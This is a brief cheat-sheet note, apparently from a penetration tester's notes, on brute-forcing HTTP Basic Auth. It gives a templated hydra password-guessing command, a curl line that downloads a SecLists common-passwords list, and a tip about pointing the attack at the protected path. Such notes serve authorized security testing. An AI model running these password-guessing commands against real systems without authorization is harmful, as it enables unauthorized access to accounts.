# Basic HTTP Auth Brute-Force

`http-get` handles Basic Auth. Path goes after the service name — don't omit it.

```bash
hydra -l <USER> -P <WORDLIST> <TARGET> http-get / -s <PORT>
```

Grab SecLists common-passwords if you don't have a wordlist staged:

```bash
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
```

> [!tip] Path matters — if auth protects `/admin` not `/`, point it there or you'll get false negatives.